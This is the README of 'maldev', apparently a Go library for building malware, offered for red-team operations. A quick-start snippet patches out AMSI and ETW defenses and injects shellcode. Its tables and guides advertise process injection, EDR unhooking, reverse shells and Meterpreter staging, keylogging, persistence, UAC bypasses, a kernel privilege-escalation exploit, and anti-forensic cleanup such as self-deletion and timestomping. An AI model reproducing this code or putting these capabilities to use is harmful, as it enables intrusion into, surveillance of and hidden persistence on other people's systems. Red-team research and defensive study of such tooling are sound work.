# maldev

Modular malware development library in Go for offensive security research.

[![Go Reference](https://pkg.go.dev/badge/github.com/oioio-space/maldev.svg)](https://pkg.go.dev/github.com/oioio-space/maldev)

## Install

```bash
go get github.com/oioio-space/maldev@latest
```

## Quick Start

```go
import (
    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/amsi"
    "github.com/oioio-space/maldev/evasion/etw"
    "github.com/oioio-space/maldev/inject"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// 1. Create a Caller for stealthy syscalls
caller := wsyscall.New(wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()))

// 2. Disable defenses
evasion.ApplyAll([]evasion.Technique{
    amsi.ScanBufferPatch(),
    etw.All(),
}, caller)

// 3. Inject shellcode
injector, _ := inject.NewWindowsInjector(&inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodCreateThread},
    SyscallMethod: wsyscall.MethodIndirect,
})
injector.Inject(shellcode)
```

## Packages

| Category | Packages | Highlights |
|----------|----------|------------|
| **Crypto & Encoding** | `crypto/` `encode/` `hash/` `random/` `useragent/` | AES-GCM, ChaCha20, XOR, RC4, TEA, XTEA, ArithShift, S-Box, Agent Smith matrix, Base64, UTF-16LE, ROR13, ssdeep, TLSH |
| **Windows Primitives** | `win/api/` `win/syscall/` `win/ntapi/` `win/token/` `win/privilege/` `win/impersonate/` `win/user/` `win/domain/` `win/version/` | PEB walk, 4 syscall methods (WinAPI/NativeAPI/Direct/Indirect), 5 SSN resolvers (Hell's/Halo's/Tartarus/Hash Gate, Chain), token theft, privilege escalation |
| **Evasion** | `evasion/amsi/` `etw/` `unhook/` `sleepmask/` `hwbp/` `acg/` `blockdlls/` `antidebug/` `antivm/` `sandbox/` `timing/` `herpaderping/` `phant0m/` `fakecmd/` `hideprocess/` `stealthopen/` `cet/` | AMSI/ETW patching, ntdll unhooking (Classic/Full/Perun), sleep encryption, HW breakpoint detection, Herpaderping, PEB CommandLine spoofing (self + remote via SpoofPID), target NtQSI patching, NTFS Object ID file access, Intel CET shadow-stack opt-out + ENDBR64 marker |
| **Injection** | `inject/` | 15+ methods: CreateThread, EarlyBird APC, ThreadHijack, NtQueueApcThreadEx, EtwpCreateEtwThread, SectionMap, PhantomDLL, Callback, ThreadPool, KernelCallbackTable, Fiber, DirectSyscall + Linux (Ptrace, MemFD, ProcMem) |
| **PE Operations** | `pe/srdi/` `pe/parse/` `pe/strip/` `pe/bof/` `pe/morph/` `pe/cert/` `pe/clr/` `pe/winres/` | PE-to-shellcode via [Donut](https://github.com/Binject/go-donut) (EXE/DLL/.NET/VBS/JS), BOF COFF loader, PE sanitization, Authenticode cert manipulation, in-process .NET CLR hosting, compile-time manifest/icon/VERSIONINFO embedding (masquerade) |
| **C2** | `c2/shell/` `c2/transport/` `c2/transport/namedpipe/` `c2/multicat/` `c2/meterpreter/` `c2/cert/` | Reverse shell with PTY (Linux) + reconnect, multi-session listener (operator-side), Meterpreter staging (TCP/HTTP/HTTPS), TLS with JA3 fingerprinting, malleable C2, named pipe transport (Windows), PPID spoofing |
| **System** | `system/ads/` `system/drive/` `system/folder/` `system/network/` `system/lnk/` `system/bsod/` `system/ui/` | NTFS Alternate Data Streams CRUD + hidden files, drive monitoring, special folder paths, LNK creation |
| **Process** | `process/enum/` `process/session/` | Cross-platform process enumeration (Windows + Linux), Terminal Services session listing, cross-session process creation, thread impersonation |
| **Persistence** | `persistence/registry/` `persistence/startup/` `persistence/scheduler/` `persistence/service/` | Run/RunOnce keys, Startup folder LNK, Task Scheduler (COM ITaskService), Windows service |
| **Collection** | `collection/keylog/` `collection/clipboard/` `collection/screenshot/` | Keyboard hook with process context, clipboard monitoring, multi-monitor screen capture |
| **Cleanup** | `cleanup/selfdelete/` `cleanup/memory/` `cleanup/service/` `cleanup/timestomp/` `cleanup/wipe/` | Self-deletion (ADS rename + batch + reboot), secure memory wipe, service DACL hiding, timestomping |
| **Privilege & Exploits** | `uacbypass/` `exploit/cve202430088/` | 4 UAC bypass methods (FODHelper, SLUI, SilentCleanup, EventVwr), CVE-2024-30088 kernel LPE |

## Documentation

### Guides

| Guide | Description |
|-------|-------------|
| **[Getting Started](docs/getting-started.md)** | First steps -- concepts, terminology, your first implant |
| **[Architecture](docs/architecture.md)** | Layered design, dependency flow, Mermaid diagrams |
| **[OPSEC Build Pipeline](docs/opsec-build.md)** | garble, pe/strip, CallByHash -- building for operations |
| **[Testing](docs/testing.md)** | Battle-tested: 22+ meterpreter sessions, 35 injection combos, x64dbg binary verification |
| **[MITRE ATT&CK + D3FEND](docs/mitre.md)** | Full technique mapping with defensive countermeasures |

### Technique Reference

Each technique has a dedicated page with beginner explanation, technical details, Mermaid diagrams, usage examples, and comparison with other tools.

| Category | Techniques |
|----------|-----------|
| **[Injection](docs/techniques/injection/README.md)** | [CreateRemoteThread](docs/techniques/injection/create-remote-thread.md) · [Early Bird APC](docs/techniques/injection/early-bird-apc.md) · [Thread Hijack](docs/techniques/injection/thread-hijack.md) · [Module Stomping](docs/techniques/injection/module-stomping.md) · [Section Mapping](docs/techniques/injection/section-mapping.md) · [Callback Execution](docs/techniques/injection/callback-execution.md) · [Thread Pool](docs/techniques/injection/thread-pool.md) · [KernelCallbackTable](docs/techniques/injection/kernel-callback-table.md) · [Phantom DLL](docs/techniques/injection/phantom-dll.md) · [Arg Spoofing](docs/techniques/injection/process-arg-spoofing.md) · [EtwpCreateEtwThread](docs/techniques/injection/etwp-create-etw-thread.md) · [NtQueueApcThreadEx](docs/techniques/injection/nt-queue-apc-thread-ex.md) |
| **[Evasion](docs/techniques/evasion/README.md)** | [AMSI Bypass](docs/techniques/evasion/amsi-bypass.md) · [ETW Patching](docs/techniques/evasion/etw-patching.md) · [ntdll Unhooking](docs/techniques/evasion/ntdll-unhooking.md) · [Sleep Mask](docs/techniques/evasion/sleep-mask.md) · [HW Breakpoints](docs/techniques/evasion/hw-breakpoints.md) · [ACG + BlockDLLs](docs/techniques/evasion/acg-blockdlls.md) · [Anti-Analysis](docs/techniques/evasion/anti-analysis.md) · [PPID Spoofing](docs/techniques/evasion/ppid-spoofing.md) · [FakeCmdLine](docs/techniques/evasion/fakecmd.md) · [HideProcess](docs/techniques/evasion/hideprocess.md) · [StealthOpen](docs/techniques/evasion/stealthopen.md) · [Phant0m](docs/techniques/evasion/phant0m.md) · [Sandbox Detection](docs/techniques/evasion/sandbox.md) · [Timing Evasion](docs/techniques/evasion/timing.md) · [Presets](docs/techniques/evasion/preset.md) |
| **[Syscalls](docs/techniques/syscalls/README.md)** | [Direct & Indirect](docs/techniques/syscalls/direct-indirect.md) · [API Hashing](docs/techniques/syscalls/api-hashing.md) · [SSN Resolvers](docs/techniques/syscalls/ssn-resolvers.md) |
| **[C2 & Transport](docs/techniques/c2/README.md)** | [Reverse Shell](docs/techniques/c2/reverse-shell.md) · [Meterpreter](docs/techniques/c2/meterpreter.md) · [Transport](docs/techniques/c2/transport.md) · [Malleable HTTP](docs/techniques/c2/malleable-profiles.md) · [Multicat (multi-session)](docs/techniques/c2/multicat.md) · [Named Pipe Transport](docs/techniques/c2/namedpipe.md) |
| **[PE Operations](docs/techniques/pe/README.md)** | [Strip & Sanitize](docs/techniques/pe/strip-sanitize.md) · [BOF Loader](docs/techniques/pe/bof-loader.md) · [Morph](docs/techniques/pe/morph.md) · [PE-to-Shellcode](docs/techniques/pe/pe-to-shellcode.md) · [Certificate Theft](docs/techniques/pe/certificate-theft.md) · [CLR Hosting](docs/techniques/pe/clr.md) · [Resource Masquerade](docs/techniques/pe/masquerade.md) |
| **[Process](docs/process.md)** | [Enumeration](docs/process.md#processenum----process-enumeration) · [Session Listing](docs/process.md#list) · [Cross-Session Execution](docs/process.md#processsession----cross-session-execution) |
| **[Persistence](docs/techniques/persistence/README.md)** | [Registry Run/RunOnce](docs/techniques/persistence/registry.md) · [StartUp Folder LNK](docs/techniques/persistence/startup-folder.md) · [Task Scheduler](docs/techniques/persistence/task-scheduler.md) |
| **[Collection](docs/techniques/collection/README.md)** | [Keylogging](docs/techniques/collection/keylogging.md) · [Clipboard Capture](docs/techniques/collection/clipboard.md) · [Screen Capture](docs/techniques/collection/screenshot.md) · [Alternate Data Streams](docs/techniques/collection/alternate-data-streams.md) |
| **[Cleanup](docs/techniques/cleanup/README.md)** | [Self-Delete](docs/techniques/cleanup/self-delete.md) · [Timestomp](docs/techniques/cleanup/timestomp.md) · [Memory Wipe](docs/techniques/cleanup/memory-wipe.md) |
| **[Tokens & Privileges](docs/techniques/tokens/README.md)** | [Token Theft](docs/techniques/tokens/token-theft.md) · [Impersonation](docs/techniques/tokens/impersonation.md) · [Privilege Escalation](docs/techniques/tokens/privilege-escalation.md) |
| **[Crypto & Encoding](docs/techniques/crypto/README.md)** | [Payload Encryption](docs/techniques/crypto/payload-encryption.md) · [Fuzzy Hashing](docs/techniques/crypto/fuzzy-hashing.md) · [Encode (Base64/UTF-16LE/PowerShell)](docs/techniques/encode/README.md) |

### Composed Examples

| Example | What it demonstrates |
|---------|---------------------|
| **[Basic Implant](docs/examples/basic-implant.md)** | Evasion -> decrypt -> inject -> sleep mask |
| **[Evasive Injection](docs/examples/evasive-injection.md)** | HW breakpoints -> section mapping vs module stomping vs callback |
| **[Full Attack Chain](docs/examples/full-chain.md)** | Recon -> evasion -> inject -> C2 -> post-ex -> cleanup |

### API Reference

| Domain | Docs |
|--------|------|
| Evasion APIs | [docs/evasion.md](docs/evasion.md) |
| Injection APIs | [docs/injection.md](docs/injection.md) |
| Syscall APIs | [docs/syscalls.md](docs/syscalls.md) |
| C2 APIs | [docs/c2.md](docs/c2.md) |
| Windows Primitives | [docs/win.md](docs/win.md) |
| PE Operations | [docs/pe.md](docs/pe.md) |
| Persistence APIs | [docs/persistence.md](docs/persistence.md) |
| Collection APIs | [docs/collection.md](docs/collection.md) |
| Crypto & Encoding | [docs/crypto.md](docs/crypto.md) |
| Cleanup APIs | [docs/cleanup.md](docs/cleanup.md) |
| System Info | [docs/system.md](docs/system.md) |
| Privilege & Exploits | [docs/privilege.md](docs/privilege.md) |
| Process Management | [docs/process.md](docs/process.md) |

## Project Structure

```
maldev/
├── crypto/  encode/  hash/  random/  useragent/         # Layer 0: Pure utilities
├── win/api/  win/syscall/  win/ntapi/  win/token/        # Layer 1: OS primitives
├── win/privilege/  win/impersonate/  win/user/  win/domain/  win/version/
├── evasion/amsi/  evasion/etw/  evasion/unhook/          # Layer 2: Evasion
├── evasion/sleepmask/  evasion/hwbp/  evasion/acg/  evasion/blockdlls/
├── evasion/antidebug/  evasion/antivm/  evasion/sandbox/  evasion/timing/
├── evasion/herpaderping/  evasion/phant0m/  evasion/fakecmd/  evasion/hideprocess/  evasion/stealthopen/
├── inject/                                                # Layer 2: Injection (15+ methods)
├── pe/parse/  pe/srdi/  pe/strip/  pe/bof/  pe/morph/  pe/cert/  pe/clr/  pe/winres/
├── process/enum/  process/session/
├── system/ads/  system/drive/  system/folder/  system/network/  system/lnk/  system/bsod/  system/ui/
├── c2/shell/  c2/transport/  c2/meterpreter/  c2/cert/   # Layer 3: C2
├── persistence/registry/  persistence/startup/  persistence/scheduler/  persistence/service/
├── collection/keylog/  collection/clipboard/  collection/screenshot/
├── cleanup/selfdelete/  cleanup/memory/  cleanup/service/  cleanup/timestomp/  cleanup/wipe/
├── uacbypass/  exploit/cve202430088/
└── internal/log/  internal/compat/  testutil/  cmd/rshell/
```

## Build

```bash
go build $(go list ./...)       # development build
go test $(go list ./...)        # run tests
GOOS=linux go build $(go list ./...)  # cross-compile
```

Requirements: Go 1.21+ -- no CGO required.

## Acknowledgments

- [D3Ext/maldev](https://github.com/D3Ext/maldev) -- Original inspiration
- [Binject/go-donut](https://github.com/Binject/go-donut) + [TheWover/donut](https://github.com/TheWover/donut) -- PE-to-shellcode (pe/srdi)
- [microsoft/go-winio](https://github.com/microsoft/go-winio) -- ADS concepts (system/ads)

## License

For authorized security research, red team operations, and penetration testing only.
